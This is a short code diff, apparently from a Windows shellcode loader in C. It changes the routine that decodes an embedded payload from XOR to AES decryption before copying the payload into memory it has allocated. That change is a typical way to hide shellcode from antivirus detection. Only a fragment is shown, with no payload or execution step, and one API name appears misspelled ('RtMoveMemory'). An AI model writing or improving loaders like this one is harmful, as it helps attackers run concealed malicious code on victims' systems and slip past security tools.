@@ -46,8 +46,8 @@ int main(void) {
     //allocate a buffer for payload
     exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-    //decrypt (DeXOR) the payload
-    XOR((char *) payload, payload_len, key, sizeof(key));
+    //decrypt the payload
+    AESDecrypt((char *) payload, payload_len, key, sizeof(key));
 
     //copy payload to allocated buffer
     RtMoveMemory(exec_mem, payload, payload_len);
